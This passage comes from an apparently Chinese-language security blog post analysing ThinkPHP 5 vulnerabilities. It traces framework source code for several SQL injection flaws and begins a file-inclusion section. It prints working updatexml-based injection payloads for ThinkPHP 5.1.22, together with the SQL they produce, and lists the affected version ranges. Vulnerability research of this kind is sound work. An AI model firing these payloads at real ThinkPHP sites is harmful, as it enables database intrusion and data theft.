srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å‰é¢æåˆ°äº†æˆ‘ä»¬çš„è¾“å…¥ä¼šç»è¿‡Requestçš„get()æ–¹æ³•ã€‚å®ƒä¼šä¸€è·¯è°ƒç”¨input()ï¼ŒgetFilter(),filterValue(),filterExp()æ¥å¤„ç†æˆ‘ä»¬çš„è¾“å…¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterExp</span><span class="params">(&amp;$value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// è¿‡æ»¤æŸ¥è¯¢ç‰¹æ®Šå­—ç¬¦</span></span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>, $value)) &#123;</span><br><span class="line">        $value .= <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TODO å…¶ä»–å®‰å…¨è¿‡æ»¤</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åƒä¹‹å‰çš„expä¼šè¢«å˜æˆ<code>exp</code>çš„å¤„ç†ã€‚ä½†æ˜¯5.0.10ç‰ˆæœ¬çš„è¿‡æ»¤æ˜¯æœ‰é—®é¢˜çš„ã€‚é—®é¢˜å‡ºåœ¨<code>NOTLIKE</code>ä¸Šã€‚å…¶æ›´æ–°ç‰ˆæœ¬çš„å¤„ç†æ˜¯åŠ å…¥äº†<code>NOT LIKE</code>.</p><p>æ¥ä¸‹æ¥è·Ÿä¸Šé¢é‚£ä¸ªå…¨ç‰ˆæœ¬çš„sqlæ³¨å…¥å¯ä»¥æŒ‰ä¸€æ ·çš„æµç¨‹èµ°åˆ°parseWhereItemé‚£ã€‚<br>æˆ‘ä»¬çš„exp<code>not like</code>å­˜åœ¨äºthis-&gt;expè¿™ä¸ªæ•°ç»„.æ‰€ä»¥ä¼šè¿›å…¥åº•ä¸‹<code>elseif (&#39;LIKE&#39; == $exp || &#39;NOT LIKE&#39; == $exp)</code>çš„åˆ†æ”¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="string">'LIKE'</span> == $exp || <span class="string">'NOT LIKE'</span> == $exp) &#123;</span><br><span class="line"><span class="comment">// æ¨¡ç³ŠåŒ¹é…</span></span><br><span class="line"><span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $item) &#123;</span><br><span class="line">        $array[] = $key . <span class="string">' '</span> . $exp . <span class="string">' '</span> . <span class="keyword">$this</span>-&gt;parseValue($item, $field);</span><br><span class="line">    &#125;</span><br><span class="line">    $logic = <span class="keyword">isset</span>($val[<span class="number">2</span>]) ? $val[<span class="number">2</span>] : <span class="string">'AND'</span>;</span><br><span class="line">    $whereStr .= <span class="string">'('</span> . implode($array, <span class="string">' '</span> . strtoupper($logic) . <span class="string">' '</span>) . <span class="string">')'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $whereStr .= $key . <span class="string">' '</span> . $exp . <span class="string">' '</span> . <span class="keyword">$this</span>-&gt;parseValue($value, $field);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>$whereStr .= &#39;(&#39; . implode($array, &#39; &#39; . strtoupper($logic) . &#39; &#39;) . &#39;)&#39;;</code>è¿™æ‹¼æ¥äº†logicå˜é‡ã€‚è€Œloginä¼šåœ¨ä¼ å…¥äº†<code>val[2]</code>çš„æ—¶å€™å–è‡ª<code>val[2]</code>ã€‚è¿™æ˜¯ä¸€ä¸ªç”¨æˆ·å¯æ§å˜é‡ã€‚æ‰€ä»¥å¯ä»¥è¾¾æˆsqlæ³¨å…¥ã€‚å‰©ä¸‹çš„æˆ‘ä»¬ç›´æ¥åœ¨å‰é¢æ„é€ ä¸€ä¸ªåˆç†çš„not likeçš„è¯­å¥å°±èƒ½åœ¨åé¢è¿›è¡Œunion select ä»è€Œæ‹¼å‡ºä¸€ä¸ªå®Œæ•´çš„sqlè¯­å¥ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä»Šå¤©å…ˆæ›´è¿™ä¹ˆå¤šå§ã€‚çœ‹äº†phpè¿™ä¹ˆä¹…æœç„¶è¿˜æ˜¯nodejsæ›´é¦™â€¦â€¦</p><h2 id="tp5-sqli-orderby"><a href="#tp5-sqli-orderby" class="headerlink" title="tp5-sqli-orderby"></a>tp5-sqli-orderby</h2><p>Index.phpé…ç½®å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $orderby = request()-&gt;get(<span class="string">'orderby'</span>);</span><br><span class="line">        $result = db(<span class="string">'users'</span>)-&gt;where([<span class="string">'username'</span> =&gt; <span class="string">'byc_404'</span>])-&gt;order($orderby)-&gt;find();</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(æ•°æ®åº“ä¸­usersè¡¨å·²æœ‰byc_404ç”¨æˆ·)<br>è¿™é‡Œä½¿ç”¨tp5.1.22ç‰ˆæœ¬ã€‚æ³¨å…¥payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orderby[id&#96;|updatexml(1,concat(0x7e,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p>ä»æˆåŠŸè§¦å‘æ³¨å…¥çš„ä½ç½®æˆ‘ä»¬å¯ä»¥çœ‹åˆ°sqlè¯­å¥å¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`users`</span> <span class="keyword">WHERE</span> <span class="string">`username`</span> = <span class="string">'byc_404'</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`id`</span>|updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#` LIMIT 1</span></span><br></pre></td></tr></table></figure><p>è·Ÿä¸‹æµç¨‹ã€‚é¦–å…ˆ5.1.22å¯¹è¾“å…¥åšçš„è¿‡æ»¤è·Ÿä»¥å¾€ç‰ˆæœ¬ä¸å¤ªä¸€æ ·äº†ã€‚æˆ‘ä»¬å…ˆçœ‹çœ‹getæ–¹æ³•çš„å¤„ç†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;get)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;get = $_GET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;get, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>input()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// è·å–åŸå§‹æ•°æ®</span></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">        <span class="comment">// è§£æname</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $default;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£æè¿‡æ»¤å™¨</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        reset($data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// å¼ºåˆ¶ç±»å‹è½¬æ¢</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬çš„<code>$data</code>æ˜¯æ•°ç»„çš„è¯ã€‚èµ°çš„æ˜¯<code>array_walk_recursive</code>ã€‚è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata &#x3D; NULL ] ) : bool</span><br><span class="line">å°†ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•° callback åº”ç”¨åˆ° array æ•°ç»„ä¸­çš„æ¯ä¸ªå•å…ƒ</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘å†™è¿™æ ·ä¸€ä¸ªdemo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"testtest1232333"</span>,<span class="string">"b##"</span>=&gt;<span class="string">"tes#tt##est"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $str=str_replace(<span class="string">"#"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    <span class="keyword">echo</span>($str.<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$end=array_walk_recursive($a,<span class="string">'sanitize'</span>);</span><br></pre></td></tr></table></figure><p>è‡ªå®šä¹‰ä¸€ä¸ªå›è°ƒå‡½æ•°å°†å­—ç¬¦ä¸­é—´çš„<code>#</code>æ›¿æ¢ä¸ºç©ºã€‚å…¶è¾“å‡ºä¸º<br><img src="/2020/08/05/Thinkphp-vuln/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¯ä»¥çœ‹åˆ°å®é™…ä¸Šåªéå†äº†æ•°ç»„çš„å€¼ã€‚æ²¡æœ‰å¤„ç†æ•°ç»„çš„é”®ã€‚æ‰€ä»¥è¿™é‡Œçš„filtervalueå¯¹æ•°ç»„çš„é”®æ²¡æœ‰ä»»ä½•å½±å“ã€‚</p><p>ä¹‹åæ‰§è¡Œè¯­å¥æ“ä½œæ—¶ã€‚æˆ‘ä»¬çš„whereä»ç„¶è·Ÿå‰é¢ä¸€æ ·ã€‚å°†å€¼å­˜å‚¨åœ¨<code>$options</code>æ•°ç»„ä¸­ã€‚è€Œæ¥å—æˆ‘ä»¬ç”¨æˆ·è¾“å…¥<code>order</code>æ–¹æ³•ä¹Ÿæ˜¯ä¸€æ ·ã€æœ€ç»ˆå€¼è¢«å®Œæ•´å­˜è¿›<code>$this-&gt;options[&#39;order&#39;]</code>ä¸­</p><p>ç„¶åè‡ªç„¶åˆæ˜¯<code>find</code>äº†ã€‚å®ƒè°ƒç”¨<code>Builder</code>ç±»çš„<code>select</code>è‚¯å®šå·²ç»éå¸¸ç†Ÿæ‚‰äº†ã€‚ä¸è¿‡è¿™æ¬¡æˆ‘ä»¬orderbyè¿›å…¥çš„æ˜¯è¿™ä¸ªåˆ†æ”¯<code>$this-&gt;parseOrder($query, $options[&#39;order&#39;])</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span><span class="params">(Query $query, $order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">'[rand]'</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">' '</span>, strpos($val, <span class="string">' '</span>) ? $val : $val . <span class="string">' '</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">'ASC'</span>, <span class="string">'DESC'</span>], <span class="keyword">true</span>) ? <span class="string">' '</span> . $sort : <span class="string">''</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="keyword">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">' ORDER BY '</span> . implode(<span class="string">','</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŒæ ·æ²¡æœ‰è¿‡æ»¤ã€‚å¤„ç†çš„å‡½æ•°åªæœ‰ä¸€ä¸ªparseKeyã€‚æ³¨æ„è¿™é‡Œçš„parseKeyæ˜¯db/builder/Mysql.phpä¸­çš„parseKeyã€‚</p><p><img src="/2020/08/05/Thinkphp-vuln/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å®ƒå¯¹keyçš„å¤„ç†åªæ˜¯åŠ äº†åå¼•å·ç¯ç»•ã€‚å› æ­¤å…¶å®æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ã€‚æˆ‘ä»¬æ³¨å…¥payloadåªéœ€ç”¨æ³¨é‡Šç¬¦å³å¯è§£å†³æ‰ã€‚</p><p>æœ€åå®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼šåœ¨æ‹¼æ¥å­—ç¬¦ä¸²å‰å¯¹å˜é‡è¿›è¡Œæ£€æŸ¥ï¼Œçœ‹æ˜¯å¦å­˜åœ¨ <code>)</code>ã€<code>#</code> ä¸¤ä¸ªç¬¦å·</p><h2 id="tp5-sqli-Aggregatefunciton"><a href="#tp5-sqli-Aggregatefunciton" class="headerlink" title="tp5-sqli-Aggregatefunciton"></a>tp5-sqli-Aggregatefunciton</h2><p>tp5sqlæ³¨å…¥æœ€åä¸€ä¸ªæ˜¯mysqlèšåˆå‡½æ•°å¯¼è‡´çš„æ¼æ´ã€‚ ç‰ˆæœ¬æ˜¯5.0.0&lt;=ThinkPHP&lt;=5.0.21 ã€ 5.1.3&lt;=ThinkPHP5&lt;=5.1.25<br>ä¸åŒç‰ˆæœ¬åˆ©ç”¨payloadéœ€è¦å¾®è°ƒã€‚</p><p>ä¾‹å¦‚5.1.22ç‰ˆæœ¬payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?options&#x3D;id&#96;)+updatexml(1,concat(0x7e,user(),0x7e),1) from users#</span><br></pre></td></tr></table></figure><p><img src="/2020/08/05/Thinkphp-vuln/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆ‘ä»¬è¿˜æ˜¯è·Ÿè¿›æºç ã€‚ä»å‰é¢å‡ æ¬¡çš„ç»éªŒæˆ‘ä»¬å·²ç»å¯ä»¥æ€»ç»“å‡º,tp5å­˜åœ¨æ¼æ´çš„å‡ ä¸ªç‰ˆæœ¬å¯¹è¾“å…¥çš„è¿‡æ»¤åŸºæœ¬æ²¡æœ‰æˆ–è€…å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚æ­¤å¤„æˆ‘ä»¬çš„è¾“å…¥åŒæ ·æ²¡æœ‰å—åˆ°è¿‡æ»¤å½±å“ã€‚å› æ­¤ç›´æ¥ä»<code>$result = db(&#39;users&#39;)-&gt;max($options);</code>è¿™é‡Œè·Ÿè¿›maxå‡½æ•°ã€‚å‘ç°è¿›è€Œè°ƒç”¨äº†<code>aggregate</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aggregate</span><span class="params">($aggregate, $field, $force = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;parseOptions();</span><br><span class="line"></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;connection-&gt;aggregate(<span class="keyword">$this</span>, $aggregate, $field);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">'fetch_sql'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($force) &#123;</span><br><span class="line">        $result = (float) $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­çœ‹åˆ°Connectionç±»çš„aggregate</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aggregate</span><span class="params">(Query $query, $aggregate, $field)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $field = $aggregate . <span class="string">'('</span> . <span class="keyword">$this</span>-&gt;builder-&gt;parseKey($query, $field, <span class="keyword">true</span>) . <span class="string">') AS tp_'</span> . strtolower($aggregate);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;value($query, $field, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parsekeyå‡½æ•°ä¸Šé¢ä¸€ä¸ªæ³¨å…¥çš„ä¾‹å­æåˆ°äº†ã€‚æ˜¯å¯¹æˆ‘ä»¬çš„è¾“å…¥åœ¨ä¸¤ä¾§åŠ åå¼•å·çš„ä½œç”¨ã€‚é‚£ä¹ˆè‡ªç„¶æˆ‘ä»¬æ³¨å…¥payloadå¯ä»¥é—­åˆåŠ æ³¨é‡Šç¬¦è§£å†³æ‰ã€‚ä¸‹é¢ç›´æ¥çœ‹value.valueåŒæ ·ä¼šè°ƒç”¨æˆ‘ä»¬éå¸¸ç†Ÿæ‚‰çš„builderçš„selectæ–¹æ³•ã€‚åªä¸è¿‡è¿™æ¬¡è°ƒç”¨çš„æ˜¯<code>parseField</code> ã€‚æœ€åè¿˜æ˜¯æ²¡æœ‰åšä»»ä½•è¿‡æ»¤å¤„ç†ã€‚è¿”å›è¯­å¥ã€‚</p><p>å®Œæ•´è¯­å¥å¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MAX</span>(<span class="string">`id`</span>)+updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#`) AS tp_max FROM `users` LIMIT 1</span></span><br></pre></td></tr></table></figure><p>è‡³æ­¤tp5çš„sqlæ³¨å…¥ç³»åˆ—å°±ç»“æŸäº†ã€‚æ˜å¤©å¼€å§‹å…ˆçœ‹rce,ä¹‹åæ˜¯ååºåˆ—åŒ–popé“¾ã€‚</p><h2 id="tp5-lfi"><a href="#tp5-lfi" class="headerlink" title="tp5-lfi"></a>tp5-lfi</h2><p>Index.phpé…ç½®å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½±å“ç‰ˆæœ¬:5.0.0&lt;=ThinkPHP5&lt;=5.0.18 